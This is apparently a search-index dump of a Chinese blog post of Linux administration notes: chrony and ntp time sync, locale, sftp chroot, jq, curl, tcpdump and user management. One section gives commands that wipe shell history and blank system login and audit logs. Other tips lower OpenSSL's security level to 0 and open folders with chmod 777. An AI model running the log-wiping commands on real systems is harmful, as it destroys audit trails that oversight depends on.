/usr/sbin/ntpdate ntp.aliyun.com # 写入RTC硬件时间 hwclock -w ","date":"2023-06-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/:3:20","series":null,"tags":["blog","linux"],"title":"linux命令与配置","uri":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/#时间同步"},{"categories":["blog"],"content":" 时间同步 NTP 源 阿里NTP 腾讯NTP pool.ntp.org公益组织 微软 NTP time.windows.com 谷歌NTP Cloudflare-NTP 时区 # 查看当前时间和配置 timedatectl # 查询可用的时区 timedatectl list-timezones | grep -i shang # 设置时区 timedatectl set-timezone Asia/Shanghai chrony - 主机环境chrony 在各方面有优势，但是依赖 chronyd 守护进程，chronyc 只是一个客户端。所以不适用于容器 # 通常自带chrony apt install chrony -y # 查看当前的源 # ^* 当前使用 ^+ 备用 ^? 不可用 chronyc sources -v # 查看当前状态 chronyc tracking # 手动同步时间 chronyc makestep # 写入RTC硬件时间。如果开启chronyd守护进程会11分钟自动同步一次，但是手动操作的话建议还是主动同步一下 hwclock -w # systemd管理自动同步，通常自带 systemctl enable chrony --now 如果没有源，vim /etc/chrony/chrony.conf 参考下面 # 配置不同的源 server ntp.cloud.aliyuncs.com minpoll 4 maxpoll 10 iburst server ntp.aliyun.com minpoll 4 maxpoll 10 iburst # Ignore stratum in source selection. stratumweight 0.05 # Record the rate at which the system clock gains/losses time. driftfile /var/lib/chrony/drift # Enable kernel RTC synchronization. rtcsync # In first three updates step the system clock instead of slew # if the adjustment is larger than 10 seconds. makestep 10 3 # Allow NTP client access from local network. #allow 192.168/16 # Listen for commands only on localhost. bindcmdaddress 127.0.0.1 bindcmdaddress ::1 # Disable logging of client accesses. noclientlog # Send a message to syslog if a clock adjustment is larger than 0.5 seconds. logchange 0.5 logdir /var/log/chrony #log measurements statistics tracking ntp - 原始/容器ntp 版本： apt install ntp ntpdate -y # 同步时间 ntpdate ntp.aliyun.com 0 * * * * /usr/sbin/ntpdate ntp.aliyun.com # 写入RTC硬件时间 hwclock -w ","date":"2023-06-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/:3:20","series":null,"tags":["blog","linux"],"title":"linux命令与配置","uri":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/#ntp-源"},{"categories":["blog"],"content":" 时间同步 NTP 源 阿里NTP 腾讯NTP pool.ntp.org公益组织 微软 NTP time.windows.com 谷歌NTP Cloudflare-NTP 时区 # 查看当前时间和配置 timedatectl # 查询可用的时区 timedatectl list-timezones | grep -i shang # 设置时区 timedatectl set-timezone Asia/Shanghai chrony - 主机环境chrony 在各方面有优势，但是依赖 chronyd 守护进程，chronyc 只是一个客户端。所以不适用于容器 # 通常自带chrony apt install chrony -y # 查看当前的源 # ^* 当前使用 ^+ 备用 ^? 不可用 chronyc sources -v # 查看当前状态 chronyc tracking # 手动同步时间 chronyc makestep # 写入RTC硬件时间。如果开启chronyd守护进程会11分钟自动同步一次，但是手动操作的话建议还是主动同步一下 hwclock -w # systemd管理自动同步，通常自带 systemctl enable chrony --now 如果没有源，vim /etc/chrony/chrony.conf 参考下面 # 配置不同的源 server ntp.cloud.aliyuncs.com minpoll 4 maxpoll 10 iburst server ntp.aliyun.com minpoll 4 maxpoll 10 iburst # Ignore stratum in source selection. stratumweight 0.05 # Record the rate at which the system clock gains/losses time. driftfile /var/lib/chrony/drift # Enable kernel RTC synchronization. rtcsync # In first three updates step the system clock instead of slew # if the adjustment is larger than 10 seconds. makestep 10 3 # Allow NTP client access from local network. #allow 192.168/16 # Listen for commands only on localhost. bindcmdaddress 127.0.0.1 bindcmdaddress ::1 # Disable logging of client accesses. noclientlog # Send a message to syslog if a clock adjustment is larger than 0.5 seconds. logchange 0.5 logdir /var/log/chrony #log measurements statistics tracking ntp - 原始/容器ntp 版本： apt install ntp ntpdate -y # 同步时间 ntpdate ntp.aliyun.com 0 * * * * /usr/sbin/ntpdate ntp.aliyun.com # 写入RTC硬件时间 hwclock -w ","date":"2023-06-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/:3:20","series":null,"tags":["blog","linux"],"title":"linux命令与配置","uri":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/#时区"},{"categories":["blog"],"content":" 时间同步 NTP 源 阿里NTP 腾讯NTP pool.ntp.org公益组织 微软 NTP time.windows.com 谷歌NTP Cloudflare-NTP 时区 # 查看当前时间和配置 timedatectl # 查询可用的时区 timedatectl list-timezones | grep -i shang # 设置时区 timedatectl set-timezone Asia/Shanghai chrony - 主机环境chrony 在各方面有优势，但是依赖 chronyd 守护进程，chronyc 只是一个客户端。所以不适用于容器 # 通常自带chrony apt install chrony -y # 查看当前的源 # ^* 当前使用 ^+ 备用 ^? 不可用 chronyc sources -v # 查看当前状态 chronyc tracking # 手动同步时间 chronyc makestep # 写入RTC硬件时间。如果开启chronyd守护进程会11分钟自动同步一次，但是手动操作的话建议还是主动同步一下 hwclock -w # systemd管理自动同步，通常自带 systemctl enable chrony --now 如果没有源，vim /etc/chrony/chrony.conf 参考下面 # 配置不同的源 server ntp.cloud.aliyuncs.com minpoll 4 maxpoll 10 iburst server ntp.aliyun.com minpoll 4 maxpoll 10 iburst # Ignore stratum in source selection. stratumweight 0.05 # Record the rate at which the system clock gains/losses time. driftfile /var/lib/chrony/drift # Enable kernel RTC synchronization. rtcsync # In first three updates step the system clock instead of slew # if the adjustment is larger than 10 seconds. makestep 10 3 # Allow NTP client access from local network. #allow 192.168/16 # Listen for commands only on localhost. bindcmdaddress 127.0.0.1 bindcmdaddress ::1 # Disable logging of client accesses. noclientlog # Send a message to syslog if a clock adjustment is larger than 0.5 seconds. logchange 0.5 logdir /var/log/chrony #log measurements statistics tracking ntp - 原始/容器ntp 版本： apt install ntp ntpdate -y # 同步时间 ntpdate ntp.aliyun.com 0 * * * * /usr/sbin/ntpdate ntp.aliyun.com # 写入RTC硬件时间 hwclock -w ","date":"2023-06-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/:3:20","series":null,"tags":["blog","linux"],"title":"linux命令与配置","uri":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/#chrony---主机环境"},{"categories":["blog"],"content":" 时间同步 NTP 源 阿里NTP 腾讯NTP pool.ntp.org公益组织 微软 NTP time.windows.com 谷歌NTP Cloudflare-NTP 时区 # 查看当前时间和配置 timedatectl # 查询可用的时区 timedatectl list-timezones | grep -i shang # 设置时区 timedatectl set-timezone Asia/Shanghai chrony - 主机环境chrony 在各方面有优势，但是依赖 chronyd 守护进程，chronyc 只是一个客户端。所以不适用于容器 # 通常自带chrony apt install chrony -y # 查看当前的源 # ^* 当前使用 ^+ 备用 ^? 不可用 chronyc sources -v # 查看当前状态 chronyc tracking # 手动同步时间 chronyc makestep # 写入RTC硬件时间。如果开启chronyd守护进程会11分钟自动同步一次，但是手动操作的话建议还是主动同步一下 hwclock -w # systemd管理自动同步，通常自带 systemctl enable chrony --now 如果没有源，vim /etc/chrony/chrony.conf 参考下面 # 配置不同的源 server ntp.cloud.aliyuncs.com minpoll 4 maxpoll 10 iburst server ntp.aliyun.com minpoll 4 maxpoll 10 iburst # Ignore stratum in source selection. stratumweight 0.05 # Record the rate at which the system clock gains/losses time. driftfile /var/lib/chrony/drift # Enable kernel RTC synchronization. rtcsync # In first three updates step the system clock instead of slew # if the adjustment is larger than 10 seconds. makestep 10 3 # Allow NTP client access from local network. #allow 192.168/16 # Listen for commands only on localhost. bindcmdaddress 127.0.0.1 bindcmdaddress ::1 # Disable logging of client accesses. noclientlog # Send a message to syslog if a clock adjustment is larger than 0.5 seconds. logchange 0.5 logdir /var/log/chrony #log measurements statistics tracking ntp - 原始/容器ntp 版本： apt install ntp ntpdate -y # 同步时间 ntpdate ntp.aliyun.com 0 * * * * /usr/sbin/ntpdate ntp.aliyun.com # 写入RTC硬件时间 hwclock -w ","date":"2023-06-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/:3:20","series":null,"tags":["blog","linux"],"title":"linux命令与配置","uri":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/#ntp---原始容器"},{"categories":["blog"],"content":" 配置中文 export LANG=zh_CN.UTF-8 # 查看当前shell环境locale locale # 查看系统locale localectl # 查看系统有的字符集 localectl list-locales # 如果有中文字体 localectl set-locale LANG=zh_CN.UTF-8 # 默认英文 localectl set-locale LANG=en_US.UTF-8 # 没有效果? 重启生效 vim /etc/locale.conf LANG=zh_CN.UTF-8 LC_ALL=\"zh_CN.UTF-8\" # 或者 vim .bashrc export LANG=zh_CN.UTF-8 export LC_ALL=\"zh_CN.UTF-8\" # 搜索所有语言包 apt search language-pack* # 搜索中文包 apt search language-pack-zh* # 建议选用 apt install language-pack-zh-hans -y ","date":"2023-06-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/:3:21","series":null,"tags":["blog","linux"],"title":"linux命令与配置","uri":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/#配置中文"},{"categories":["blog"],"content":" sftp 配置sftp 只需要 1 个端口，强制加密，所有环境都自带。 # 准备一个ftp目录 mkdir /ftp-data # 创建一个共享目录，所有sftp用户都可以访问 mkdir -p /ftp-data/shared chmod 777 /ftp-data/shared # 创建用户sftp_a，指定默认shell为sftp，用户目录/ftp-data useradd -m -s /usr/lib/sftp-server -d /ftp-data sftp_a # 密码 passwd sftp_a # 用户独有的目录 mkdir -p /ftp-data/a # 授权只有自己可以使用（root不受限制） chown sftp_a:sftp_a /ftp-data/a chmod 700 /ftp-data/a # 编辑ssh配置文件，限制登录和命令 vim /etc/ssh/sshd_config Match User sftp_a ChrootDirectory /ftp-data ForceCommand internal-sftp AllowTcpForwarding no X11Forwarding no # 重启ssh服务生效 systemctl restart ssh # 可以上面的步骤创建更多的用户 ","date":"2023-06-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/:3:22","series":null,"tags":["blog","linux"],"title":"linux命令与配置","uri":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/#sftp-配置"},{"categories":["blog"],"content":" 开启 bbrbbr 是一种浪费网络资源，提升网络速度和稳定性的通讯手段。 echo \"net.core.default_qdisc=fq\" \u003e\u003e /etc/sysctl.conf echo \"net.ipv4.tcp_congestion_control=bbr\" \u003e\u003e /etc/sysctl.conf # 生效 sysctl -p # 验证 lsmod | grep bbr ","date":"2023-06-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/:3:23","series":null,"tags":["blog","linux"],"title":"linux命令与配置","uri":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/#开启-bbr"},{"categories":["blog"],"content":" 修改登录后的提示信息 vim /etc/motd Welcome to Alibaba Cloud Elastic Compute Service ! ","date":"2023-06-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/:3:24","series":null,"tags":["blog","linux"],"title":"linux命令与配置","uri":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/#修改登录后的提示信息"},{"categories":["blog"],"content":" 常见操作","date":"2023-06-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/:4:0","series":null,"tags":["blog","linux"],"title":"linux命令与配置","uri":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/#常见操作"},{"categories":["blog"],"content":" jq 处理 jsonjq官网文档 # 计算每个remote_addr请求每个host主机的次数 cat kentxxq.com.log | jq '.[\"@fields\"] | .remote_addr + \" \" + .host' | sort | uniq -c | sort -k1n # 条件过滤 'select(.[\"@timestamp\"] \u003c= $end_time and .[\"@fields\"].remote_addr == $target_remote_addr)' # 在上面的基础上,限制时间不能早于11点,晚于13点 jq -r 'select(.[\"@timestamp\"] \u003e= \"2023-10-09T11:00:05+0800\" and .[\"@timestamp\"] \u003c= \"2023-10-09T13:00:05+0800\" ) | .[\"@fields\"] | .remote_addr + \" \" + .host' kentxxq.com.log | sort | uniq -c | sort -k1n # 效果,性能差不多. 但可以用tail -f xxx来监控 cat kentxxq.com.log | jq -c 'select(.[\"@timestamp\"] \u003e= \"2023-10-09T11:00:05+0800\" and .[\"@timestamp\"] \u003c= \"2023-10-09T13:00:05+0800\" ) | .[\"@fields\"] | .remote_addr + \" \" + .host' | sort | uniq -c | sort -k1n # 输出到新文件 jq --arg start \"2023-10-09T00:00:00+08:00\" --arg end \"2023-10-09T23:59:59+08:00\" 'select(.[\"@timestamp\"] \u003e= $start and .[\"@timestamp\"] \u003c= $end)' log.json \u003e filtered_log.json # tail -f 版本 tail -f log.json | jq --arg start \"2023-10-09T00:00:00+08:00\" --arg end \"2023-10-09T23:59:59+08:00\" 'select(.[\"@timestamp\"] \u003e= $start and .[\"@timestamp\"] \u003c= $end)' \u003e filtered_log.json ","date":"2023-06-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/:4:1","series":null,"tags":["blog","linux"],"title":"linux命令与配置","uri":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/#jq-处理-json"},{"categories":["blog"],"content":" curl # -X 指定请求方式 大写 # -H 设置请求头，可以多个-H # -d 指定payload的数据 curl -X POST -H \"Accept: application/json\" -H \"Content-type: application/json\" -d '{\"post_data\":\"i_love_immvp.com\"}' localhost:8096/api/answer/checkAnswer # 忽略证书 curl -k https://127.0.0.1:5001/ # 下载 -C - 断点续传,记得多一个中杠 -O 指定名称 curl -C - https://dl.min.io/server/minio/release/linux-amd64/archive/minio_20230711212934.0.0_amd64.deb -O minio.deb # 模拟跨域 curl -vvv 'https://kentxxq.com/Count' -H 'Origin: http://localhost:3000' # 请求es curl -H \"Content-Type: application/json\" -XPUT --user elastic:password es-cn-oew1whnk60023e4s9.elasticsearch.aliyuncs.com:9200/flow_user_index/_settings -d '{\"index.mapping.total_fields.limit\":0}' 结果 {\"acknowledged\":true} # 计时 https://susam.net/blog/timing-with-curl.html curl -L -w \"time_namelookup: %{time_namelookup} time_connect: %{time_connect} time_appconnect: %{time_appconnect} time_pretransfer: %{time_pretransfer} time_redirect: %{time_redirect} time_starttransfer: %{time_starttransfer} time_total: %{time_total} \" https://example.com/ 报错 curl: (35) error:0A000172:SSL routines::wrong signature type # 修改文件 vim /etc/ssl/openssl.cnf [system_default_sect] CipherString = DEFAULT:@SECLEVEL=0 ","date":"2023-06-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/:4:2","series":null,"tags":["blog","linux"],"title":"linux命令与配置","uri":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/#curl"},{"categories":["blog"],"content":" 代理 apt # 临时 -o Acquire::http::proxy=\"https://user1:pass1@a.kentxxq.com:17890\" -o Acquire::https::proxy=\"https://user1:pass1@a.kentxxq.com:17890\" # 永久,文件不存在就创建 vim /etc/apt/apt.conf.d/95proxy.conf Acquire::http::proxy \"https://user1:pass1@a.kentxxq.com:17890\"; Acquire::https::proxy \"https://user1:pass1@a.kentxxq.com:17890\"; ","date":"2023-06-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/:4:3","series":null,"tags":["blog","linux"],"title":"linux命令与配置","uri":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/#代理-apt"},{"categories":["blog"],"content":" tcpdump # -nn 不解析域名-加速 # -w 175.6.6.238.pcap 指定文件名 # 指定网络接口 # host 175.6.6.238 捕获ip地址为 xxx , 可以src host或者dst host # port 8088 捕获端口为 8088,可以 src port或者dst host tcpdump -i eth0 src host 175.6.6.238 and dst port 80 -nn # 协议 tcpdump icmp tcpdump tcp tcpdump 'ip \u0026\u0026 tcp' ","date":"2023-06-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/:4:4","series":null,"tags":["blog","linux"],"title":"linux命令与配置","uri":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/#tcpdump"},{"categories":["blog"],"content":" 校验 sha 256 curl -Lo tempo_2.1.1_linux_amd64.deb https://github.com/grafana/tempo/releases/download/v2.1.1/tempo_2.1.1_linux_amd64.deb # 校验输出tempo_2.1.1_linux_amd64.deb: OK echo 6e031625b2046d360cf8c4897614523869f45b52286e4fb69e25811d2509b651 \\ tempo_2.1.1_linux_amd64.deb | sha256sum -c ","date":"2023-06-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/:4:5","series":null,"tags":["blog","linux"],"title":"linux命令与配置","uri":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/#校验-sha-256"},{"categories":["blog"],"content":" 系统安装时间 # 根路径的创建时间 stat / | awk '/Birth: /{print $2 \" \" substr($3,1,5)}' # 文件系统的创建时间 fsname=$(df / | tail -1 | cut -f1 -d' ') \u0026\u0026 tune2fs -l $fsname | grep 'created' ","date":"2023-06-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/:4:6","series":null,"tags":["blog","linux"],"title":"linux命令与配置","uri":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/#系统安装时间"},{"categories":["blog"],"content":" 清除历史记录 # 清除指定id history -d 123 # 清除所有历史记录 history -c # 清理系统记录 echo \u003e /var/log/lastlog ; echo \u003e /var/log/utmp ; cat /dev/null \u003e /var/log/secure ; cat /dev/null \u003e /var/log/message ; echo \u003e /var/log/btmp ; echo \u003e /var/log/wtmp ; ","date":"2023-06-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/:4:7","series":null,"tags":["blog","linux"],"title":"linux命令与配置","uri":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/#清除历史记录"},{"categories":["blog"],"content":" dpkg 软件包查找 # 查看列表,过滤列表 dpkg -l | grep kubelet # 查看kubelet相关的文件 dpkg -L kubelet ","date":"2023-06-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/:4:8","series":null,"tags":["blog","linux"],"title":"linux命令与配置","uri":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/#dpkg-软件包查找"},{"categories":["blog"],"content":" 用户会话处理 # 查看会话 w USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT root pts/0 175.9.140.51 Thu14 1.00s 0.08s 0.00s w root pts/1 tmux(368975).%7 09Aug23 29days 0.10s 0.10s -bash # 杀死指定会话 pkill -KILL -t pts/1 ","date":"2023-06-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/:4:9","series":null,"tags":["blog","linux"],"title":"linux命令与配置","uri":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/#用户会话处理"},{"categories":["blog"],"content":" 大版本升级 apt install update-manager-core -y do-release-upgrade -d 通常新 lts 发布只是发布镜像, 用于新机安装. 需要过一段时间才会提供升级选项. ","date":"2023-06-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/:4:10","series":null,"tags":["blog","linux"],"title":"linux命令与配置","uri":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/#大版本升级"},{"categories":["blog"],"content":" 跑分 wget http://soft.vpser.net/test/unixbench/unixbench-5.1.2.tar.gz tar zxvf unixbench-5.1.2.tar.gz cd unixbench-5.1.2/ vim Makefile # GRAPHIC_TESTS = defined make ./Run ","date":"2023-06-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/:4:11","series":null,"tags":["blog","linux"],"title":"linux命令与配置","uri":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/#跑分"},{"categories":["blog"],"content":" 软链接 ln # ln -s 现有文件/目标文件 链接文件 # 创建/usr/local/nginx/sbin/nginx的快捷方式到/usr/local/bin/nginx # 软连接的目标文件可以被替换,替换后会链接到新文件 ln -s /usr/local/nginx/sbin/nginx /usr/local/bin/nginx # 查看软链接的实际路径 readlink -f /lib/systemd/system/nginx.service /usr/lib/systemd/system/nginx.service ","date":"2023-06-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/:4:12","series":null,"tags":["blog","linux"],"title":"linux命令与配置","uri":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/#软链接-ln"},{"categories":["blog"],"content":" 命令手册 man # 查看手册有哪些章节 man -k crontab # 查看手册,默认是章节1 man crontab # 查看特定章节.文档中cron(8)/crontab(5),代表对应的文档(章节) man 5 crontab ","date":"2023-06-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/:4:13","series":null,"tags":["blog","linux"],"title":"linux命令与配置","uri":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/#命令手册-man"},{"categories":["blog"],"content":" 配置主机名 hostnamectl set-hostname master1 ","date":"2023-06-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/:4:14","series":null,"tags":["blog","linux"],"title":"linux命令与配置","uri":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/#配置主机名"},{"categories":["blog"],"content":" shell 退出码 # 正常退出 ls EXCODE=$? echo $EXCODE # 0 # 异常错误 ls --- EXCODE=$? echo $EXCODE # 2 # shell脚本 EXCODE=$? if [ \"$EXCODE\" != \"0\" ]; then echo \"有问题！\" exit 1; fi ","date":"2023-06-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/:4:15","series":null,"tags":["blog","linux"],"title":"linux命令与配置","uri":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/#shell-退出码"},{"categories":["blog"],"content":" 用户, 组, 加入组, 权限 # 创建组dba,组号6001 groupadd -g 6001 dba # 创建用户sam,同时指定主目录 useradd –d /home/sam -m sam # 设置密码 passwd sam #把sam加入dba组 usermod -a -G dba sam # 修改目录拥有者:组 chown -R sam:dba file/folder # 放开权限给所有用户 chmod 777 file/folder ","date":"2023-06-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/:4:16","series":null,"tags":["blog","linux"],"title":"linux命令与配置","uri":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/#用户-组-加入组-权限"},{"categories":["blog"],"content":" 安装/卸载软件 # 安装deb包 dpkg -i minio.deb # 搜索查看已安装的包 dpkg --list # 查看正则匹配的包 # 查看以dotnet-开头的包 dpkg --list 'dotnet-*' # 卸载匹配的包 sudo apt-get --purge remove \u003cprogramname\u003e # 按照正则卸载匹配的包 # 卸载以dotnet-开头的包 sudo apt-get --purge remove 'dotnet-*' # 如果不想自己手动输入Y确认的话则使用 echo \"Y\" |sudo apt-get --purge remove 'dotnet-*' ","date":"2023-06-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/:4:17","series":null,"tags":["blog","linux"],"title":"linux命令与配置","uri":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/#安装卸载软件"},{"categories":["blog"],"content":" 端口状态检查 # 端口正常为0，否则状态码/退出码为1 nc -zv 127.0.0.1 6443 echo $? nc -zv 127.0.0.1 6444 echo $? ","date":"2023-06-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/:4:18","series":null,"tags":["blog","linux"],"title":"linux命令与配置","uri":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/#端口状态检查"},{"categories":["blog"],"content":" 查看文件 # less 只读超大文件 # 输入F可以滚动输出,刷新当前屏幕,不刷屏.也可以手动输入G,移到底部 # q输出 /搜索 less file.txt # head 文件尾部 head -n 10 file.txt # tail 文件尾部 # tail -f 滚动输出 # 配合 |grep 过滤 tail -f file.txt # 末尾10行 tail -n 10 file.txt ","date":"2023-06-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/:4:19","series":null,"tags":["blog","linux"],"title":"linux命令与配置","uri":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/#查看文件"},{"categories":["blog"],"content":" 删除 x 天前的文件 find /data/weblog/ -name '*.log.*' -type f -mtime +7 -exec rm -f {} \\; ","date":"2023-06-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/:4:20","series":null,"tags":["blog","linux"],"title":"linux命令与配置","uri":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/#删除-x-天前的文件"},{"categories":["blog"],"content":" 清空文件 # 快速清空 \u003efile.txt # 截断任意文件 truncate -s 0 file.txt ","date":"2023-06-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/:4:21","series":null,"tags":["blog","linux"],"title":"linux命令与配置","uri":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/#清空文件"},{"categories":["blog"],"content":" 查看进程启动时间 ps -eo pid,lstart,etime | grep 1310 1310 Sat Aug 10 10:21:25 2019 242-07:26:58 # 前面是启动时间，后面是启动了242天又7小时 ","date":"2023-06-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/:4:22","series":null,"tags":["blog","linux"],"title":"linux命令与配置","uri":"/posts/%E7%AC%94%E8%AE%B0/linux%E5%91%BD%E4%BB%A4%E4%B8%8E%E9%85%8D%E7%BD%AE/#查看进程启动时间"},{"categories":["blog"],"content":" 压缩/解压 tar # z是使用gzip # v是查看细节 # f是指定文件 # --strip-components=1 去掉一层解压目录 # 查看文件内容 tar -tf xxx.tar.gz # 打包 tar -czvf dist.tgz dist/ # 解压 